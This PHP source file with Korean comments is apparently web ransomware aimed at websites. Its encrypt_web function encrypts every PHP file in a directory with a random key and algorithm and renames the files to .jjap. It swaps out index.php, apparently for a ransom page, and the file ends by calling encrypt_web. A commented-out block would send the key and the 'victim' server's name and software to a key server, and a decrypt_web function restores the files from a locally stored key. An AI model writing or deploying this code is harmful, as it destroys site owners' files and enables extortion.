	// 암호화 함수
	function encrypt_web() {
		
		$encrypt_key = random_key(20);
		$encrypt_key_hased = substr(hash('sha256', (string)$encrypt_key, true), 0, 32);
		
		$encrypt_alg = random_alg();
		
		// 암호화키와 알고리즘을 로컬에 파일로 저장
		file_put_contents("./key&alg", $encrypt_key.".".$encrypt_alg);
		
		// 암호화키와 알고리즘, 로컬 정보를 서버로 전송
		/*
		$key_server_addr = "";
		$victim_info = array(
			'encrypt_key' => $encrypt_key,
			'encrypt_alg' => $encrypt_alg,
			'victim_name' => $_SERVER['SERVER_NAME'],
			'victim_sw' => $_SERVER['SERVER_SOFTWARE']
		);
		post($key_server_addr, $victim_info);
		*/
		
		// 디렉터리 목록 읽어서 php 파일만 암호화
		$directory_list = getdir('./');
		for ($i = 0; $i <= count($directory_list); $i++) {
			
			$chk_ext = explode('.', $directory_list[$i]);
			$chk_ext = array_reverse($chk_ext);
			$file_name = explode('/', $chk_ext[1]);
			$file_name = array_reverse($file_name);
			
			if ($file_name[0] != 'index' and $file_name[0] != 'exe' and $file_name[0] != 'altindex') {
				if (strtolower($chk_ext[0]) == 'php') {
					$file_contents = file_get_contents($directory_list[$i]);
					$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
					$encrypted_contents = openssl_encrypt($file_contents, $encrypt_alg, $encrypt_key_hased, OPENSSL_RAW_DATA, $iv);
					$fp = fopen($directory_list[$i], 'r+');
					fwrite($fp, $encrypted_contents);
					fclose($fp);
					rename($directory_list[$i], $chk_ext[1].".jjap");
				}
			}
		}
		
		if (!file_exists("./index.php.bak")) {
			rename('./index.php', './index.php.bak');
		}
		while (TRUE) { if (create_index()) { break; } }
		
		return 0;
	}
	
	// 복호화 함수
	function decrypt_web() {
		
		// 로컬에 저장된 암호화키와 알고리즘으로 복호화
		if (!file_exists("./key&alg")) {
			file_put_contents("./decrypt_failed", "key&alg file does not exist");
		} else {
			$key_alg_contents = file_get_contents("./key&alg");
			$key_alg_contents = explode(".", $key_alg_contents);
			$decrypt_alg = $key_alg_contents[1];
			$decrypt_key_hased = substr(hash('sha256', (string)$key_alg_contents[0], true), 0, 32);
		}
		
		unlink("./index.php");
		rename ("./index.php.bak", "./index.php");
			
		// 서버에서 받은 암호화키와 알고리즘으로 복호화
		/*
		*/
		
		// 디렉터리 목록 읽어서 암호화된 파일 복호화
		$directory_list = getdir('./');
		for ($i = 0; $i <= count($directory_list); $i++) {
			
			$chk_ext = explode('.', $directory_list[$i]);
			$chk_ext = array_reverse($chk_ext);
			
			if ($chk_ext[0] == "jjap") {
				$file_contents = file_get_contents($directory_list[$i]);
				$iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
				$decrypted_contents = openssl_decrypt($file_contents, $decrypt_alg, $decrypt_key_hased, OPENSSL_RAW_DATA, $iv);
				$fp = fopen($directory_list[$i], 'r+');
				fwrite($fp, $decrypted_contents);
				fclose($fp);
				rename($directory_list[$i], $chk_ext[1].".php");
			}
		}
		
		unlink("./key&alg");
		unlink("./exe.php");
		
		return 0;
	}

	encrypt_web();
